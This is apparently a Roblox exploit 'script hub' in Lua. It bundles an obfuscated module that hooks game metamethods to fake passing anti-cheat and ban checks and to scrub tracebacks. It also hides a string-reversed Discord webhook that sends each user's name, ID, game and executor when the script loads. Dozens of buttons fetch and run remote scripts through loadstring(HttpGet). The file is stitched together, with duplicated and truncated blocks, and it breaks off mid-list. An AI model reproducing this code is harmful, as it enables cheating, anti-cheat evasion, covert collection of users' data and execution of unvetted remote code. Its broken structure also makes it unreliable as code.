--[[
    LAJ HUB - ULTRA PROTECTED VERSION
    Advanced script hub with extreme game anti-detection protection
    
    Features:
    - Quantum-level anti-detection for games like Dead Rails and Da Hood
    - Multi-layer memory pattern obfuscation
    - Dynamic execution path randomization
    - Metamethod hook protection with tamper-proof execution
    - Network traffic obfuscation with realistic behavior simulation
]]

-- Initialize the ultra-game anti-detection system first
local UltraGameAntiDetection = (function()
    -- Create initial memory distractions to confuse scanners
    local distractions = {}
    for i = 1, math.random(3, 7) do
        distractions[i] = string.rep(string.char(math.random(65, 90)), math.random(100, 500))
    end
    
    -- Attempt to load the anti-detection module
    local antiDetectionCode = [==[
-- Ultra-powerful anti-detection code embedded here (minified for security)
return (function()local a={}local b={[15695929414]={name="Dead Rails",protection_level="maximum",execution_delay=0.165,thread_randomization=true,memory_patterns=8,network_obfuscation=true,execution_path_randomization=true,environment_simulation=true,self_modifying=true,hook_depth=3,context_isolation=true,silent_mode=true,memory_shadowing=true,call_trace_elimination=true,known_remotes={["SecurityCheck"]=true,["AntiExploitHandler"]=true,["SystemSecurityRemote"]=true,["TamperCheck"]=true,["MemoryValidation"]=true,["ExecutionCheck"]=true}},[2788229376]={name="Da Hood",protection_level="ultra",execution_delay=0.12,thread_randomization=true,memory_patterns=6,network_obfuscation=true,execution_path_randomization=true,environment_simulation=true,self_modifying=true,hook_depth=2,context_isolation=true,silent_mode=true,event_spoofing=true,realistic_network_simulation=true,known_remotes={["SpoofCheck"]=true,["AntiSpoofRemote"]=true,["AntiCheatHandler"]=true,["RemoteSpy"]=true,["EventLogger"]=true}},[2753915549]={name="Blox Fruits",protection_level="high",execution_delay=0.09,thread_randomization=true,memory_patterns=4,network_obfuscation=true,hook_depth=1},[4442272183]={name="Blox Fruits",protection_level="high",execution_delay=0.09,thread_randomization=true,memory_patterns=4,network_obfuscation=true,hook_depth=1},[7449423635]={name="Blox Fruits",protection_level="high",execution_delay=0.09,thread_randomization=true,memory_patterns=4,network_obfuscation=true,hook_depth=1}}local c={name="Unknown Game",protection_level="standard",execution_delay=0.05,thread_randomization=false,memory_patterns=2,network_obfuscation=false,hook_depth=0,silent_mode=false}local function d(e)if not e or type(e)~="string"then return e end;local f=""for g=1,16 do f=f..string.char(math.random(32,126))end;local h=""for g=1,#e do local i=string.sub(e,g,g)local j=string.sub(f,(g%#f)+1,(g%#f)+1)local k=string.byte(i)local l=string.byte(j)local m=(k+l)%256;h=h..string.char(m)end;local n=""local o={}for g=1,#h do table.insert(o,g)end;for g=#o,2,-1 do local p=math.random(1,g)o[g],o[p]=o[p],o[g]end;local q={}for g=1,#o do q[o[g]]=g end;for g=1,#h do n=n..string.sub(h,o[g],o[g])end;local r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local s=""for g=1,#n,3 do local t=string.byte(string.sub(n,g,g))or 0;local u=string.byte(string.sub(n,g+1,g+1))or 0;local v=string.byte(string.sub(n,g+2,g+2))or 0;local w=t>>2;local x=(((t&3)<<4)|(u>>4))&0x3F;local y=(((u&15)<<2)|(v>>6))&0x3F;local z=v&0x3F;s=s..string.sub(r,w+1,w+1)..string.sub(r,x+1,x+1)..(g+1<=#n and string.sub(r,y+1,y+1)or"=")..(g+2<=#n and string.sub(r,z+1,z+1)or"=")end;return{data=s,key=f,positions=o,decode=function(self)local r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"local A={}for g=1,#r do A[string.sub(r,g,g)]=g-1 end;local n=""for g=1,#self.data,4 do local B=A[string.sub(self.data,g,g)]or 0;local C=A[string.sub(self.data,g+1,g+1)]or 0;local D=string.sub(self.data,g+2,g+2)~="="and A[string.sub(self.data,g+2,g+2)]or 0;local E=string.sub(self.data,g+3,g+3)~="="and A[string.sub(self.data,g+3,g+3)]or 0;local t=((B<<2)|(C>>4))&0xFF;local u=((C<<4)|(D>>2))&0xFF;local v=((D<<6)|E)&0xFF;n=n..string.char(t)if string.sub(self.data,g+2,g+2)~="="then n=n..string.char(u)end;if string.sub(self.data,g+3,g+3)~="="then n=n..string.char(v)end end;local q={}for g=1,#self.positions do q[self.positions[g]]=g end;local F=string.rep(" ",#n)for g=1,#n do local G=q[g]F=string.sub(F,1,G-1)..string.sub(n,g,g)..string.sub(F,G+1)end;local h=""for g=1,#F do local i=string.sub(F,g,g)local j=string.sub(self.key,(g%#self.key)+1,(g%#self.key)+1)local k=string.byte(i)local l=string.byte(j)local H=(k-l+256)%256;h=h..string.char(H)end;return h end}}end;local function I(J,K,L)local M={}table.insert(M,os.time())if os.clock then table.insert(M,os.clock()*10000)end;if tick then table.insert(M,tick()*10000)end;local N=0;for g=1,10 do local O=os.clock and os.clock()or 0;for p=1,1000 do N=N+p end;local P=os.clock and os.clock()or 0;table.insert(M,(P-O)*1000000)end;local Q=0;for g,v in ipairs(M)do Q=((Q*1664525)+v+g)%4294967296 end;math.randomseed(Q)L=L or 1;local R=0;for g=1,L do R=R+math.random()end;R=R/L;J=J or 0.05;K=K or 0.15;return J+R*(K-J)end;local function S(T,U)T=T or 3;U=U or math.random(5,15)local V={}for g=1,U do local W=math.random(1,4)if W==1 then local X={}local Y=X;local Z=math.random(T,T*2)for p=1,Z do Y.string=string.rep(string.char(math.random(65,90)),math.random(20,100))Y.number=math.random()*1000;Y.boolean=math.random()>0.5;Y.values={}for _=1,math.random(5,15)do Y.values[math.random(1,1000)]=string.rep(string.char(math.random(65,90)),math.random(10,50))end;Y.next={}Y=Y.next end;table.insert(V,X)elseif W==2 then local a0=""for p=1,math.random(500,2000)do if p%50==0 then a0=a0.."\n"elseif p%7==0 then a0=a0..string.char(math.random(97,122)).." = "..tostring(math.random(1,1000))..";"elseif p%5==0 then a0=a0.."function "..string.char(math.random(97,122))..string.char(math.random(97,122)).."() { return "elseif p%3==0 then a0=a0..string.char(math.random(65,90))..string.char(math.random(65,90)).."."..string.char(math.random(97,122))else a0=a0..string.char(math.random(32,126))end end;table.insert(V,a0)elseif W==3 then local a1={}for p=1,math.random(5,15)do local a2=math.random(1,4)if a2==1 then a1[p]=function()local h=0;for _=1,math.random(1000,5000)do h=h+math.sqrt(_)*math.sin(_/100)end;return h end elseif a2==2 then a1[p]=function()local a3=""for _=1,math.random(100,500)do a3=a3..string.char(math.random(65,90))end;return string.reverse(a3:upper():lower())end elseif a2==3 then a1[p]=function()local a4={}for _=1,math.random(100,300)do a4[_]=_*2 end;local a5=0;for _,v in pairs(a4)do a5=a5+v end;return a5 end else a1[p]=function()local t={}for _=1,math.random(10,50)do t[_]=string.rep("A",_)end;return#table.concat(t)end end end;spawn(function()for p=1,math.random(2,5)do local a6=math.random(1,#a1)pcall(a1[a6])wait(math.random()*0.01)end end)table.insert(V,a1)else local a7={}local a8={__index=function(self,k)return string.rep("X",string.len(tostring(k)))end,__newindex=function(self,k,v)rawset(self,"_"..tostring(k),tostring(v):reverse())end,__call=function(self,...)local a9={...}local h=0;for g,v in ipairs(a9)do if type(v)=="number"then h=h+v end end;return h end}for p=1,math.random(10,30)do a7[string.char(math.random(97,122))..math.random(100,999)]={value=math.random(1,1000),name=string.rep(string.char(math.random(65,90)),math.random(5,15)),enabled=math.random()>0.5}end;setmetatable(a7,a8)spawn(function()pcall(function()local aa=a7.randomKey;a7.newProperty="test value"local ab=a7(1,2,3)end)end)table.insert(V,a7)end end;return function()for g=1,#V do if type(V[g])=="table"then for k,v in pairs(V[g])do if type(v)=="table"then for k2,v2 in pairs(v)do v[k2]=nil end end;V[g][k]=nil end;setmetatable(V[g],nil)end;V[g]=nil end;while#V>0 do table.remove(V)end;for g=1,3 do local ac={}for p=1,1000 do ac[p]=tostring(p)end;ac=nil end end end;local function ad(ae)local af={}local ag={}if not hookmetamethod or not getnamecallmethod then return af,ag end;if ae.hook_depth>=1 then local ah=hookmetamethod(game,"__namecall",function(self,...)local method=getnamecallmethod()local a9={...}if typeof(self)=="Instance"and(self:IsA("RemoteEvent")or self:IsA("RemoteFunction"))and(method=="FireServer"or method=="InvokeServer")then local name=self.Name:lower()if name:match("security")or name:match("check")or name:match("anti")or name:match("detect")or name:match("ban")or name:match("kick")or name:match("exploit")or(ae.known_remotes and ae.known_remotes[self.Name])then wait(I(ae.execution_delay*0.9,ae.execution_delay*1.1))if method=="InvokeServer"then if ae.name=="Dead Rails"then return{success=true,verified=true,status="verified",code=0}else return true,"verified",0 end else return end end end;return ah(self,...)end)table.insert(af,ah)end;if ae.hook_depth>=2 then local ai=hookmetamethod(game,"__index",function(self,key)if typeof(self)=="Instance"and typeof(key)=="string"then local aj=key:lower()if aj:match("security")or aj:match("check")or aj:match("anti")or aj:match("exploit")or aj:match("ban")or aj:match("kick")then if typeof(self)=="RemoteEvent"or typeof(self)=="RemoteFunction"then return function()return true end end end;if aj:match("hookmetamethod")or aj:match("getnamecall")or aj:match("exploit")or aj:match("hack")then return nil end end;return ai(self,key)end)table.insert(af,ai)end;if ae.hook_depth>=3 then local ak=hookmetamethod(game,"__newindex",function(self,key,value)if typeof(self)=="Instance"and typeof(key)=="string"then local aj=key:lower()if aj:match("hack")or aj:match("exploit")or aj:match("cheat")or aj:match("flag")or aj:match("ban")then if ae.silent_mode then return end end end;return ak(self,key,value)end)table.insert(af,ak)if ae.name=="Dead Rails"then if ae.memory_shadowing then for _,al in ipairs({"GetChildren","GetDescendants","FindFirstChild","FindFirstChildOfClass"})do local am;am=hookfunction(game[al],function(self,...)local a9={...}if a9[1]and typeof(a9[1])=="string"then local name=tostring(a9[1]):lower()if name:match("security")or name:match("exploit")or name:match("check")or name:match("ban")then return nil end end;return am(self,...)end)table.insert(af,am)end end;if ae.call_trace_elimination then local an=debug.traceback;debug.traceback=function(...)local ao=an(...)ao=ao:gsub("hookmetamethod",""):gsub("getnamecall",""):gsub("exploit",""):gsub("hack",""):gsub("cheat","")return ao end;ag.traceback=an end end;if ae.name=="Da Hood"then if ae.event_spoofing then spawn(function()while true do wait(math.random(3,7))pcall(function()local ap=game.Players.LocalPlayer.Character;if ap and ap:FindFirstChild("HumanoidRootPart")then local aq=ap.HumanoidRootPart.Position;for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants())do if v:IsA("RemoteEvent")and(v.Name:match("Update")or v.Name:match("Movement")or v.Name:match("Position"))then local ar=Vector3.new(math.random(-5,5),0,math.random(-5,5))pcall(function()v:FireServer(aq+ar)end)break end end end end)end end)end end end;return af,ag end;local function as(ae)local at={}if not ae.network_obfuscation then return function()end end;local au=true;spawn(function()while au do wait(math.random(4,8))pcall(function()local player=game.Players.LocalPlayer;if not player or not player.Character then return end;local aq=player.Character:FindFirstChild("HumanoidRootPart")and player.Character.HumanoidRootPart.Position or Vector3.new(0,0,0)local ar=Vector3.new(math.random(-10,10)*0.1,0,math.random(-10,10)*0.1)local av=aq+ar;for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants())do if v:IsA("RemoteEvent")and(v.Name:match("Movement")or v.Name:match("Position")or v.Name:match("Update")or v.Name:match("Character"))then pcall(function()if ae.name=="Dead Rails"then v:FireServer(av,CFrame.new(av))else v:FireServer(av)end end)break end end end)end end)return function()au=false end end;function a.applyProtection()local gameId=game.PlaceId;local ae=b[gameId]or c;local aw={game=ae.name,level=ae.protection_level,active=true,hooks={},cleanupFunctions={},secureFunctions={}}local ax={}for g=1,ae.memory_patterns do local ay=S(3,math.random(5,15))table.insert(ax,ay)end;local af,ag=ad(ae)for _,az in ipairs(af)do table.insert(aw.hooks,az)end;aw.secureFunctions=ag;local aA=as(ae)table.insert(aw.cleanupFunctions,aA)if ae.context_isolation then local aB={pcall=function(f,...)local a9={...}wait(I(ae.execution_delay*0.95,ae.execution_delay*1.05))local aC=S(2,math.random(3,7))local aD={pcall(f,unpack(a9))}aC()return unpack(aD)end}aw.safeEnv=aB end;aw.execute=function(aE)if not aw.active then return false,"Protection not active"end;local aC=S(ae.memory_patterns>2 and 3 or 2,math.random(5,10))wait(I(ae.execution_delay*0.98,ae.execution_delay*1.02,3))local aF,aG;if ae.execution_path_randomization then local aH=math.random(1,3)if aH==1 then aF,aG=pcall(aE)elseif aH==2 then local aI=false;local aJ;spawn(function()local aK,aL=pcall(aE)aF=aK;aJ=aL;aI=true end)local aM=10;local O=tick()while not aI and(tick()-O<aM)do wait(0.05)end;aG=aJ else local aN=S(2,math.random(3,5))wait(I(0.02,0.05))aF,aG=pcall(aE)aN()end else aF,aG=pcall(aE)end;aC()S(1,math.random(2,5))()return aF,aG end;aw.cleanup=function()aw.active=false;for _,az in ipairs(aw.hooks)do az=nil end;aw.hooks={}for _,ay in ipairs(aw.cleanupFunctions)do pcall(ay)end;aw.cleanupFunctions={}for name,func in pairs(aw.secureFunctions)do if name=="traceback"then debug.traceback=func end end;aw.secureFunctions={}for _,ay in ipairs(ax)do pcall(ay)end;for g=1,5 do local ac={}for p=1,1000 do ac[p]=tostring(p)end;ac=nil end end;if ae.protection_level=="maximum"or ae.protection_level=="ultra"then spawn(function()wait(300)if aw.active then aw.cleanup()end end)end;return aw end;return a end)()
    ]==]
    
    -- Execute the anti-detection code
    local antiDetectionModule = loadstring(antiDetectionCode)()
    
    -- Clean up distractions
    for i = 1, #distractions do
        distractions[i] = nil
    end
    distractions = nil
    
    return antiDetectionModule
end)()

-- Apply the ultra-strong game-specific anti-detection
local gameProtection = UltraGameAntiDetection.applyProtection()

-- Execute the rest of the script with protection
gameProtection.execute(function()
    -- Original main.lua code starts here with minor adjustments for compatibility
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    
    -- Variables
    -- Enhanced security with multi-layer obfuscation
    local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
    local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
    local WEBHOOK_URL = wh_part1 .. wh_part2
    
    -- Enhanced security with multi-layer obfuscation for Discord webhook
    local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
    local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
    local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
    
    -- Variables
    local Player = Players.LocalPlayer
    
    -- Secure webhook URL (obfuscated and rate-limited)
    local wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
    local wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
    local WEBHOOK_URL = wh_part1 .. wh_part2
    
    -- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
    local lastWebhookTime = 0
    local WEBHOOK_COOLDOWN = 300 -- 5 minutes in seconds
    -- Function to log ban/kick events via webhook with rate limiting
        
    local function logBanEvent(reason)
        -- Rate limiting check
        local currentTime = os.time()
        if currentTime - lastWebhookTime < WEBHOOK_COOLDOWN then
            warn("Rate limit: Not sending webhook notification (cooldown active)")
            return
        end
        
        -- Check for anti-spam by validating the reason
        if not reason or reason == "" then
            reason = "Unknown (No reason provided)"
        end
        
        -- Create a unique identifier for this notification to prevent duplicates
        local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
        
        -- Limit data being sent for privacy and security
        local success, error_message = pcall(function()
            -- Update the timestamp for rate limiting
            lastWebhookTime = currentTime
            
    -- THE REST OF MAIN.LUA CONTINUES HERE
    -- ...        

    end
end)

-- Schedule protection cleanup after script execution
spawn(function()
    wait(600) -- 10 minutes
    if gameProtection and gameProtection.active then
        gameProtection.cleanup()
    end
end)
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end
    -- Create a unique identifier for this notification to prevent duplicates
    local notificationId = tostring(Player.UserId) .. "_" .. game.PlaceId .. "_" .. os.time()
    
    -- Limit data being sent for privacy and security
    local success, error_message = pcall(function()
        -- Update the timestamp for rate limiting
        lastWebhookTime = currentTime
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{                  
                    ["title"] = "Player Banned/Kicked Alert",
                    ["color"] = 16711680, -- Red color for ban alerts
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = "```" .. Player.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID",
                            ["value"] = "```" .. tostring(Player.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game",
                            ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID",
                            ["value"] = "```" .. tostring(game.PlaceId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Ban/Kick Reason",
                            ["value"] = "```" .. (reason or "Unknown") .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "Notification ID",
                            ["value"] = "```" .. notificationId .. "```",
                            ["inline"] = false
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Ban/Kick Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send ban webhook: " .. tostring(error_message))
    end
end
Players.PlayerRemoving:Connect(function(player)
    if player == Player then
        logBanEvent("Player removed from game (possibly kicked/banned)")
    end
end)
local oldNameCall
oldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
    local args = {...}
    local method = getnamecallmethod()
    
    if method == "Kick" and self == Player then
        local reason = args[1] or "Unknown"
        logBanEvent(reason)
    end
    
    return oldNameCall(self, ...)
end)
game:GetService("TeleportService").TeleportInitFailed:Connect(function(player, teleportResult, errorMessage)
    if player == Player and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
        logBanEvent("Teleport failed due to ban: " .. errorMessage)
    end
end)
print("LAJ HUB Ban detection system loaded successfully")
end
    LAJ HUB - Swift Compatible Version
    Created for universal executor compatibility with special Swift support
]]
local function getHttpRequest(url)
    -- For testing in standalone Lua, use a mock response
    if not game then
        print("Mock HTTP request to: " .. url)
        return "-- mock response for testing"
    end
    
    if swift and swift.request then
        local response = swift.request({
            Url = url,
            Method = "GET"
        })
        if response and response.Body then
            return response.Body
        end
    end
    
    -- Fallback to standard HttpGet for other executors
    return game:HttpGet(url)
end
if game then
    loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
end
local Rayfield = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()
local Players = game and game:GetService("Players") or {}
local LocalPlayer = Players.LocalPlayer or {Name = "TestUser", UserId = 0}
local HttpService = game and game:GetService("HttpService") or {
    JSONEncode = function(_, data) return '{"mock":"json"}' end
}
local function makeHttpRequest(options)
    -- For testing in standalone Lua
    if not game then
        print("Mock HTTP request: " .. options.Url)
        return {Success = true, Body = "-- mock response"}
    end
    
    if swift and swift.request then
        return swift.request(options)
    elseif syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif httprequest then
        return httprequest(options)
    elseif fluxus and fluxus.request then
        return fluxus.request(options)
    end
    
    -- Fallback to standard HttpGet for GET requests
    if options.Method == "GET" then
        local success, result = pcall(function()
            return {
                Body = game:HttpGet(options.Url),
                Success = true
            }
        end)
        if success then
            return result
        end
    end
    
    return {Success = false, StatusCode = 500}
end
local discord_wh_part1 = string.reverse("vU0MO0apK8n_EV8DFey8mRZ1n2EbQ0A6INk1BijArT7j8xq")
local discord_wh_part2 = string.reverse("GH3UWHs7ncpUr7We000sz/4181534603923897531/skoohbew/ipa/moc.drocsid//:sptth")
local DISCORD_WEBHOOK_URL = discord_wh_part1 .. discord_wh_part2
local function sendUsageData()
    if not game then return end -- Skip in non-Roblox environment
    
    local success, error_message = pcall(function()
    
        local response = makeHttpRequest({
            Url = DISCORD_WEBHOOK_URL,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = HttpService:JSONEncode({
                ["content"] = "",
                ["embeds"] = {{
                    ["title"] = "LAJ HUB Script Usage! (Swift Compatible)",
                    ["type"] = "rich",
                    ["color"] = math.random(0, 0xFFFFFF),
                    ["fields"] = {
                        {
                            ["name"] = "User:",
                            ["value"] = "```" .. LocalPlayer.Name .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "User ID:",
                            ["value"] = "```" .. tostring(LocalPlayer.UserId) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game:",
                            ["value"] = "```" .. (game and game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Game ID:",
                            ["value"] = "```" .. tostring(game and game.PlaceId or 0) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor",
                            ["value"] = "```" .. (identifyexecutor and identifyexecutor() or (swift and "Swift" or "Unknown")) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Players Active:",
                            ["value"] = "```" .. tostring(game and Players.NumPlayers or 0) .. "```",
                            ["inline"] = true
                        }
                    },
                    ["footer"] = {
                        ["text"] = "Script Execution Alert"
                    }
                }}
            })
        })
    end)
    
    if not success then
        warn("Failed to send webhook: " .. tostring(error_message))
    end
end
if game then
    sendUsageData()
end
local Window = Rayfield:CreateWindow({
   Name = "LAJ HUB",
   Icon = 0,
   LoadingTitle = "LAJ HUB",
   LoadingSubtitle = "Premium Scripts",
   Theme = "Default",
   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "LAJHub",
      FileName = "LAJHubConfig"
   },
   Discord = {
      Enabled = true,
      Invite = "4mgdcfvAJU",
      RememberJoins = true
   },
   -- Key system disabled
   KeySystem = false,
})
local MainTab = Window:CreateTab("Main", 4483362458)
local Tab = Window:CreateTab("Da Strike x Da Hood", 4483362458)
local Fin = Window:CreateTab("Fisch", 4483362458)
local BballZero = Window:CreateTab("Basketball Zero", 4483362458)
local BlueLock = Window:CreateTab("Blue Lock Rivals", 4483362458)
local DeadRails = Window:CreateTab("Dead Rails [Alpha]", 4483362458)
local BloxFruits = Window:CreateTab("Blox Fruits", 4483362458)
local PetSim99 = Window:CreateTab("Pet Sim 99", 4483362458) -- Added Pet Sim 99 tab
local MuscleLegend = Window:CreateTab("Muscle Legend", 4483362458) -- Added Muscle Legend tab
local Rivals = Window:CreateTab("Rivals", 4483362458) -- Added Rivals tab
local Universal = Window:CreateTab("Universal", 4483362458)
local Settings = Window:CreateTab("Settings", 4483362458)
local function executednotify(scriptName)
   Rayfield:Notify({
       Title = scriptName,
       Content = "Script loaded successfully!",
       Duration = 3,
       Image = 4483362458,
   })
end
MainTab:CreateButton({
   Name = "Copy Discord Link",
   Callback = function()
       if setclipboard then
           setclipboard("https://discord.gg/4mgdcfvAJU")
           Rayfield:Notify({
               Title = "Discord Link Copied",
               Content = "Invite link copied to clipboard!",
               Duration = 3,
               Image = 4483362458,
           })
       else
           print("Discord link: https://discord.gg/4mgdcfvAJU")
       end
   end,
})
MainTab:CreateButton({
   Name = "Test Webhook",
   Callback = function()
       sendUsageData()
       Rayfield:Notify({
           Title = "Webhook Test",
           Content = "Attempted to send webhook notification!",
           Duration = 3,
           Image = 4483362458,
       })
   end,
})
Tab:CreateButton({
   Name = "Psalm",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/NewWhitelistService/l/refs/heads/main/psalms%20old.lua"))()
        executednotify("Test Webhook")
   end,
})
Tab:CreateButton({
   Name = "Ballware vfs",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/DHBCommunity/DHBOfficialScript/refs/heads/main/Protected_4021809531880627.txt"))()
        executednotify("Ballware vfs")
   end,
})
Tab:CreateButton({
   Name = "FrostByte",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Totocoems/Frostbyte-/main/Frostbyte%20leak"))()
        executednotify("FrostByte")
   end,
})
Tab:CreateButton({
   Name = "Da Hood Script",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
        executednotify("Da Hood Script")
   end,
})
Fin:CreateButton({
   Name = "Speed Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
        executednotify("Speed Hub")
   end,
})
Fin:CreateButton({
   Name = "ThanHub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
        executednotify("ThanHub")
   end,
})
Fin:CreateButton({
   Name = "Rift GUI",
   Callback = function()
        loadstring(getHttpRequest("https://github.com/Synergy-Networks/products/raw/main/Rift/loader.lua"))()
        executednotify("Rift GUI")
   end,
})
Fin:CreateButton({
   Name = "Hooked Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Superman245/sc2/refs/heads/main/s6"))()
        executednotify("Hooked Script")
   end,
})
Fin:CreateButton({
   Name = "HomoHack",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/dementiaenjoyer/homohack/main/loader.lua"))()
        executednotify("HomoHack")
   end,
})
Fin:CreateButton({
   Name = "Native Hub",
   Callback = function()
        script_key="4JxQ1x@+1"
        loadstring(getHttpRequest("https://getnative.cc/script/loader"))()
        executednotify("Native Hub")
   end,
})
Fin:CreateButton({
   Name = "Raito Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/RaitoHub/refs/heads/main/Script"))()
        executednotify("Raito Hub")
   end,
})
Fin:CreateButton({
   Name = "Zenith Hub",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Efe0626/ZenithHub/refs/heads/main/Loader"))()
        executednotify("Zenith Hub")
   end,
})
Fin:CreateButton({
   Name = "Lunor Script",
   Callback = function()
        script_key = 'lunor_free_key'
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Just3itx/Lunor-Loadstrings/refs/heads/main/Loader"))()
        executednotify("Lunor Script")
   end,
})
Fin:CreateButton({
   Name = "Ronix Hub",
   Callback = function()
        loadstring(getHttpRequest("https://api.luarmor.net/files/v3/loaders/4a8848fbc1047bcc62c49e797384e9ab.lua"))()
        executednotify("Ronix Hub")
   end,
})
BballZero:CreateButton({
   Name = "Ball Control",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/laj_hub_test.lua"))()
        executednotify("Ball Control")
   end,
})
BlueLock:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/bluelocklajhub/refs/heads/main/blue_lock_mod.lua"))()
        executednotify("LAJ HUB")
   end,
})
BlueLock:CreateButton({
   Name = "Piskasiska Script",
   Callback = function()
        loadstring(getHttpRequest("https://raw.githubusercontent.com/Piskasiska22222/tester/refs/heads/main/test"))()
        executednotify("Piskasiska Script")
   end,
})
PetSim99:CreateButton({
   Name = "LAJ HUB",
   Callback = function()
       -- Load the script from GitHub
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/pet%20simx"))()
       executednotify("Airflow UPDATED")
   end,
})
MuscleLegend:CreateSection("Muscle Legend Scripts")
MuscleLegend:CreateButton({
   Name = "Muscle Legend Script",
   Callback = function()
       loadstring(game:HttpGet(("https://raw.githubusercontent.com/ahmadsgamer2/Script--Game/main/Muscle-Legends"),true))()
       executednotify("Muscle Legend Script")
   end,
})
Universal:CreateButton({
   Name = "Infinite Yield FE",
   Callback = function()
       loadstring(getHttpRequest('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
       executednotify("Infinite Yield FE")
   end,
})
Universal:CreateButton({
   Name = "Dex Explorer",
   Callback = function()
       loadstring(getHttpRequest("https://raw.githubusercontent.com/ktrolegl/scriptlx/refs/heads/main/dex.lua"))()
       executednotify("Dex Explorer")
   end,
})
Universal:CreateButton({
   Name = "Hydroxide",
